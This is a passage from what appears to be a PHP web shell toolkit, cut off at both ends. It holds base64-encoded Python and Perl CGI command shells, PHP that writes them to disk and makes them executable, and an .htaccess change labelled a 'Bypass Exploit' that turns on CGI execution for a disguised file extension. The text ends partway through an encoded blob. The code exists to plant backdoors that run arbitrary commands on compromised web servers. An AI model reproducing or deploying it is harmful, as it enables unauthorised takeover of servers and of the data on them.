cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
    chmod("python.izo",0755);
   echo " <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe></div>";
}
#==================[ Multi Bypass Exploit ]==================#
if(isset($_POST['cgi1']))
{
echo "<center/><br/><b><font color=blue>+--==[ cgitelnet.v1  Bypass Exploit]==--+ </font></b><br><br>";
 mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');      
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI \n AddType application/x-httpd-cgi .cin \n AddHandler cgi-script .cin \n AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAiMTIzNDU2IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPGh0bWw+CjxoZWFkPgo8dGl0bGU+Q0dJLVRlbG5ldCBWZXJzaW9uIDEuMDwvdGl0bGU+CiRIdG1sTWV0YUhlYWRlcgo8L2hlYWQ+Cjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPgo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4KPHRyPgo8dGQgYmdjb2xvcj0iI0MyQkZBNSIgYm9yZGVyY29sb3I9IiMwMDAwODAiIGFsaWduPSJjZW50ZXIiPgo8Yj48Zm9udCBjb2xvcj0iIzAwMDA4MCIgc2l6ZT0iMiI+IzwvZm9udD48L2I+PC90ZD4KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjRkZGRkZGIj48Yj5DR0ktVGVsbmV0IFZlcnNpb24gMS4wIC0gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9udD48L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjQzJCRkE1Ij48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT4KPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luU2NyZWVuCnsKCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjNjY5OTk5Ij4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8KLyAgX18gXHwgIF9fIFx8XyAgIF98ICAgICAgICB8XyAgIF98ICAgICAgfCB8ICAgICAgICAgICAgIHwgfAp8IC8gIFwvfCB8ICBcLyAgfCB8ICAgX19fX19fICAgfCB8ICAgIF9fXyB8IHwgXyBfXyAgICBfX18gfCB8Xwp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wKfCBcX18vXHwgfF9cIFwgX3wgfF8gICAgICAgICAgIHwgfCAgfCAgX18vfCB8fCB8IHwgfHwgIF9fL3wgfF8KIFxfX19fLyBcX19fXy8gXF9fXy8gICAgICAgICAgIFxfLyAgIFxfX198fF98fF98IHxffCBcX19ffCBcX198IDEuMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgPC9mb250Pjxmb250IGNvbG9yPSIj